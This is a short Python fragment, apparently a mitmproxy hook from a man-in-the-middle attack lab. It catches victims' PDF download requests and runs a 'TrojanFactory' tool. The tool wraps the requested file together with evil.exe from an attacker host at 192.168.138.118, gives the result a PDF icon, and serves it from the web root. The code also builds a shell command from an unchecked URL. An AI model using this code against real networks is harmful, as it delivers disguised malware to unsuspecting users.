...
def request(flow):
	...
	if flow.request.host != "192.168.138.118" and flow.request.pretty_url.endswith(".pdf"):
		print("[+] Got interesting flow")
		
		front_file = flow.request.pretty_url + "#"
		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://192.168.138.118/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
